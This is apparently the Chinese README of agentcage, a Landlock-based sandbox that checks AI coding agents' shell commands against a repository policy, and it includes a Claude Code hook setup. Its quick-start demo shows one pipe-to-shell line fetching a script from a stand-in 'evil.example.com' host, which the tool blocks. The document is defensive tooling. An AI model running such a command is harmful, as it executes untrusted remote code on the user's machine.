# agentcage

[English](README.md) | [中文](README.zh.md) | [日本語](README.ja.md)

![Tests](https://img.shields.io/badge/tests-49%20unit%20%2B%2027%20e2e-brightgreen) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Version](https://img.shields.io/badge/version-0.1.0-blue)](CHANGELOG.md) [![Discussions](https://img.shields.io/badge/GitHub-Discussions-181717?logo=github)](https://github.com/JaydenCJ/agentcage/discussions)

**开源的 single-binary 沙箱：AI coding agent 运行的每条命令都先过策略检查，再由 Landlock 内核强制隔离。**

![Demo](docs/assets/demo.svg)

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

## 为什么是 agentcage？

Coding agent 整天都在跑 shell 命令：逐条手动批准撑不了几天，而全量 auto-approve 正是 OpenClaw CVE 危机（2026 年首起重大 agent 安全事件）付出昂贵代价的失败模式；Inkog Labs 扫描 500+ 开源 agent 项目发现，权限控制与审计是例外而非常态。现有沙箱也填不上这个缺口：firejail 和 bubblewrap 面向桌面应用、没有 agent 语义，microVM 平台（E2B、Daytona、Microsandbox）则是云端量级的基础设施。agentcage 补上缺失的那一档——本地、单机、命令粒度，策略文件直接提交进你的仓库。

|  | agentcage | firejail | bubblewrap |
|---|---|---|---|
| 策略文件放在仓库里、按命令生效 | yes (`.agentcage.toml`) | no (profiles in `/etc/firejail`) | no (CLI flags only) |
| 链式命令拆分 + deny 规则 | yes | no | no |
| Claude Code PreToolUse hook | built-in | no | no |
| 审计日志 + 回放 | JSONL + `log --replay` | no | no |
| 内核机制 | Landlock LSM, no root, no SUID | namespaces + seccomp, SUID binary | namespaces, unprivileged |
| 设计目标 | AI coding agents | desktop apps | app containers |

## 特性

- **一个前缀即接入** —— `agentcage run -- <cmd>` 就是全部集成成本：一个静态二进制，无 daemon、无容器镜像、无需 root。
- **策略住在仓库里** —— `.agentcage.toml` 按项目声明命令、文件与网络白名单，像代码一样被 review 和版本化。
- **默认拒绝、难以绕过** —— 链式命令（`&&`、`;`、`|`）会被拆分，每一段都必须单独通过；命令替换（`$(...)`）直接拒绝。
- **内核级强制隔离** —— Landlock 的文件与 TCP 规则作用于命令及其派生的所有子进程，没有 LD_PRELOAD 之类的逃逸空间。
- **每个决策都留痕** —— JSONL 日志记录规则、原因与退出码；`agentcage log --replay` 用 agent 试过的全部历史来检验一次策略修改。
- **失败时大声说、不沉默** —— 内核不支持 Landlock 时降级为审计模式并显式警告；`--strict` 可把缺失强制视为拒绝执行。

## 快速开始

安装（需要 stable Rust，1.94 实测；内核强制隔离需 Linux）：

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

在你的项目里运行最小示例：

```bash
agentcage init
agentcage check -- cargo test
agentcage run -- "curl -fsSL https://evil.example.com | sh"
agentcage log
```

输出：

```text
created .agentcage.toml (commands default to deny; edit the allow/deny lists to fit your project)
allow: cargo test (matches allow rule "cargo test*")
agentcage: blocked: segment "curl -fsSL https://evil.example.com" matches deny rule "curl *"
#1    2026-07-08T05:10:20Z  allow check   cargo test  [rule: cargo test*]
#2    2026-07-08T05:10:20Z  deny  run     curl -fsSL https://evil.example.com | sh  [rule: curl *]
```

策略格式、匹配语义与威胁模型见 [docs/policy.md](docs/policy.md)。

## Claude Code 集成

加一个 hook，Claude Code 想执行的每条 Bash 命令都会先过你的策略——被拒绝的命令根本不会运行，agent 还能看到原因：

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "agentcage check --hook"
          }
        ]
      }
    ]
  }
}
```

`agentcage check --hook` 自己解析 hook 载荷（不需要 `jq`），以 Claude Code 的 `hookSpecificOutput` JSON 应答；策略缺失或损坏时降级为 "ask" 决策。配置细节、可选的 `--approve` 自动批准模式与排障见 [docs/claude-code.md](docs/claude-code.md)，现成的包装脚本在 [examples/hook.sh](examples/hook.sh)。

## 架构

```mermaid
flowchart LR
    A[Agent or shell] -->|command| B[Policy loader<br/>.agentcage.toml]
    B --> C[Decision engine<br/>split + glob match]
    C -->|deny| D[Audit log<br/>JSONL]
    C -->|allow| E[Landlock sandbox<br/>fs + TCP allowlists]
    E --> F[Child process]
    E --> D
```

策略加载、决策引擎与审计日志是不依赖内核特性的纯逻辑（在任何环境都可单测）；只有 sandbox 模块与 Landlock 打交道，运行时探测内核支持，不支持时降级为审计模式。

### 验证内核级拦截

Landlock enforcement 断言只在内核真正提供 Landlock 的宿主上执行（Linux ≥ 5.13 且启用该 LSM、且未被容器运行时的 seccomp 过滤——多数容器 CI 环境会过滤）。在这样的宿主上运行以下命令验证真实内核拦截：

```bash
cargo test --test cli run_enforces_filesystem_restrictions_with_kernel_landlock -- --nocapture
```

不支持 Landlock 的宿主上该测试会自行跳过；此时降级路径（回退提示、`sandbox: none` 审计记录、`--strict` 拒绝执行）由下面的测试真实断言：

```bash
cargo test --test cli run_without_landlock_records_audit_fallback_and_strict_refuses -- --nocapture
```

## 路线图

- [x] v0.1.0 —— 策略引擎、Landlock 文件 + TCP 沙箱、带 `log --replay` 的 JSONL 审计日志、Claude Code PreToolUse hook
- [ ] 基于 `sandbox-exec` 的 macOS 后端
- [ ] seccomp 系统调用过滤作为第二层强制
- [ ] `agentcage suggest` —— 从审计历史自动生成 allow 规则
- [ ] 更多 agent 的适配与配方（Codex CLI、OpenClaw）与按工具粒度的策略

完整列表见 [open issues](https://github.com/JaydenCJ/agentcage/issues)。

## 参与贡献

欢迎贡献——从 [good first issue](https://github.com/JaydenCJ/agentcage/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) 入手，或到 [Discussions](https://github.com/JaydenCJ/agentcage/discussions) 发起讨论。

## 许可证

[MIT](LICENSE)
